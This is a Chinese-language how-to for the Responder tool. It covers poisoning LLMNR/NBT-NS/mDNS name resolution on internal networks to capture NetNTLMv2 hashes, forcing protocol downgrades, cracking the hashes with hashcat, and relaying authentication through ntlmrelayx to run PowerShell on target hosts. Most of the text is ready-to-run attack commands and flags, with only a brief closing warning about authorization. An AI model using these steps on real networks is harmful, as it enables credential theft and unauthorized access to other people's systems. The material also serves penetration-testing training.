# Responder 基础用法

Responder 是内网渗透的"必带药"。它通过应答 LLMNR / NBT-NS / mDNS 广播查询，把自己冒充成目标资源（比如笔误的共享路径），引诱客户端用 NetNTLMv2 凭据来"登录"，然后捕获哈希。

## 安装

```bash
git clone https://github.com/lgandx/Responder.git
cd Responder
pip install -r requirements.txt
sudo python3 Responder.py -h
# 或
sudo apt install responder      # Kali 自带
```

验证：

```bash
sudo responder --version
```

## 工作原理 60 秒

Windows 在解析主机名时按这个顺序：

1. hosts 文件 → 失败
2. DNS → 失败
3. **LLMNR / NBT-NS 多播** ← Responder 抢答
4. 客户端把 SMB 请求发到攻击者
5. 客户端回 NetNTLMv2 哈希做认证
6. 攻击者抓到哈希，拿去 hashcat 模式 5600 离线爆破

## 最简启动

```bash
sudo responder -I eth0
```

默认开 SMB / HTTP / MSSQL / FTP / IMAP / POP3 / SMTP / LDAP / DNS / 等 rogue server。

## 关键参数

| 参数 | 含义 |
|---|---|
| `-I eth0` | 接口 |
| `-A` | 仅监听不投毒（合规扫描） |
| `-w` | 启 WPAD rogue 代理 |
| `-F` | 强制 NTLM auth on WPAD |
| `-b` | basic auth（替代 NTLM，明文） |
| `--lm` | 强降级到 LM |
| `--disable-ess` | 强降级到 NetNTLMv1（hashcat 模式 5500，更易爆） |
| `-v` | verbose |
| `-q` | quiet |
| `-e <ip>` | 投毒响应里返回这个 IP（不用本机） |

## 标准两步流

```bash
# 1. 第一次跑 - 仅分析（看哪些主机会触发）
sudo responder -I eth0 -A

# 2. 真投毒
sudo responder -I eth0 -wF
```

## 输出

- 终端实时打印捕获的哈希
- 文件保存在 `Responder/logs/`：
  - `Responder-Session.log` 总日志
  - `SMB-NTLMv2-SSP-<ip>.txt` 哈希文件（直接喂 hashcat）

## 离线爆破

```bash
hashcat -m 5600 SMB-NTLMv2-SSP-10.0.0.5.txt rockyou.txt -r rules/best64.rule -O
```

## 与 ntlmrelayx 联动（不破解，直接 relay）

Responder 默认占了 SMB / HTTP，要让 ntlmrelayx 接管这两个端口，先在 `/etc/responder/Responder.conf` 把：

```ini
[Responder Core]
SMB = Off
HTTP = Off
```

然后：

```bash
# Terminal A
sudo responder -I eth0

# Terminal B
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
```

抓到的认证会被 ntlmrelayx 直接转发到 `targets.txt` 里的目标完成 SMB 登录，常见后续：

- `--no-smb-server`
- `-c "powershell -enc ..."` 直接执行
- `-socks` 起 SOCKS 代理后接 nxc

## 触发场景（"鱼"为什么会咬钩）

- 用户在 Explorer 里输错共享路径 `\\fileserve` → LLMNR 投毒
- 启动时尝试 `wpad`、`isatap` → DNS 投毒
- 浏览器/IE 走 WPAD 自动代理 → 自动 NTLM 认证
- mDNS 广播（macOS / iOS 设备）

## 常见坑

- 必须 sudo（监听低端口 137/445/53 等）
- 跟 SMB 客户端 / Samba 服务冲突 → 关掉本机 smb
- 现代 Windows 默认禁 LLMNR + NTLMv1，命中率下降 → 配合 mitm6 投毒 IPv6 DNS
- 大型企业网通常已部署"防 LLMNR 投毒"探测，分分钟报警
- 公司网络里**未授权使用 = 入刑**，红队工具仅在授权范围内用
